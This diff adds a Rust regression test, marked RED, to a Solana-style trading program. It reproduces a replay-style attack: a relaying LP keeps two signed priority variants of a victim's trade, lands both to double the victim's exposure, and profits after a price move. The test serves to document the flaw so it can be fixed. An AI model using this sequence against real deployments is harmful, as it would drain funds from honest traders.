@@ -59717,3 +59717,112 @@ fn v16_attack_underfunded_exit_cannot_move_ewma_with_uncollectible_fee() {
         assert_underfunded_ewma_exit_uses_collected_fee(path);
     }
 }
+
+// An honest taker signs two priority variants for one matcher intent. The configured LP is the fee
+// payer/relayer and retains both signatures. Both variants currently land, doubling the honest
+// taker's short exposure and the LP's extractable gain after an honest mark move.
+#[test]
+fn v16_attack_tradecpi_retry_doubles_independent_victim_loss() {
+    const PRICE: u64 = 100;
+    const HIGH_PRICE: u64 = 110;
+    const DEPOSIT: u128 = 4_000_000;
+    const SIZE_Q: i128 = (10_000 * POS_SCALE) as i128;
+
+    let mut env = V16CuEnv::new();
+    env.configure_auth_mark_with_cu(0, PRICE);
+    let victim_owner = Keypair::new();
+    let attacker_lp_owner = Keypair::new();
+    let victim = env.create_portfolio(&victim_owner);
+    let attacker_lp = env.create_portfolio(&attacker_lp_owner);
+    env.deposit(&victim_owner, victim, DEPOSIT);
+    env.deposit(&attacker_lp_owner, attacker_lp, DEPOSIT);
+    let (matcher_program, matcher_context, matcher_delegate) =
+        auth_matcher_for_lp(&mut env, &attacker_lp_owner, attacker_lp);
+
+    let trade = Instruction {
+        program_id: env.program_id,
+        accounts: vec![
+            AccountMeta::new(victim_owner.pubkey(), true),
+            AccountMeta::new(env.market, false),
+            AccountMeta::new(victim, false),
+            AccountMeta::new(attacker_lp, false),
+            AccountMeta::new_readonly(matcher_program, false),
+            AccountMeta::new(matcher_context, false),
+            AccountMeta::new_readonly(matcher_delegate, false),
+        ],
+        data: ProgInstruction::TradeCpi {
+            asset_index: 0,
+            size_q: -SIZE_Q,
+            fee_bps: 0,
+            limit_price: 0,
+        }
+        .encode(),
+    };
+    env.svm.expire_blockhash();
+    let blockhash = env.svm.latest_blockhash();
+    let first = Transaction::new_signed_with_payer(
+        &[heap_ix(), cu_ix(), trade.clone()],
+        Some(&attacker_lp_owner.pubkey()),
+        &[&attacker_lp_owner, &victim_owner],
+        blockhash,
+    );
+    let retained_retry = Transaction::new_signed_with_payer(
+        &[
+            heap_ix(),
+            cu_ix(),
+            ComputeBudgetInstruction::set_compute_unit_price(1),
+            trade,
+        ],
+        Some(&attacker_lp_owner.pubkey()),
+        &[&attacker_lp_owner, &victim_owner],
+        blockhash,
+    );
+
+    env.svm
+        .send_transaction(first)
+        .expect("the victim's intended matcher trade lands");
+    env.svm
+        .send_transaction(retained_retry)
+        .expect("RED: the LP relayer lands the retained retry");
+    assert_eq!(
+        env.market_state().1.assets[0].oi_eff_long_q,
+        2 * SIZE_Q as u128,
+        "RED: one matcher intent created two copies of the victim's exposure"
+    );
+
+    env.svm.warp_to_slot(10);
+    env.push_auth_mark_with_cu(10, HIGH_PRICE);
+    for portfolio in [victim, attacker_lp] {
+        env.svm.expire_blockhash();
+        env.crank(
+            portfolio,
+            ProgInstruction::PermissionlessCrank {
+                now_slot: 10,
+                observations: crank_observations(0),
+            },
+        );
+    }
+    env.trade_cpi_with_cu(
+        &victim_owner,
+        victim,
+        &attacker_lp_owner,
+        attacker_lp,
+        matcher_program,
+        matcher_context,
+        matcher_delegate,
+        2 * SIZE_Q,
+        0,
+    );
+    env.convert_released_pnl_with_cu(&attacker_lp_owner, attacker_lp, u128::MAX);
+    let victim_capital = env.portfolio_state(victim).capital.get();
+    let attacker_capital = env.portfolio_state(attacker_lp).capital.get();
+    assert_eq!(victim_capital, DEPOSIT - 200_000);
+    assert_eq!(attacker_capital, DEPOSIT + 200_000);
+    let victim_dest = env.withdraw(&victim_owner, victim, victim_capital);
+    let attacker_dest = env.withdraw(&attacker_lp_owner, attacker_lp, attacker_capital);
+    assert_eq!(env.token_amount(victim_dest), (DEPOSIT - 200_000) as u64);
+    assert_eq!(env.token_amount(attacker_dest), (DEPOSIT + 200_000) as u64);
+    panic!(
+        "RED: retained retry transferred an extra 100,000 atoms from the honest taker to the LP"
+    );
+}
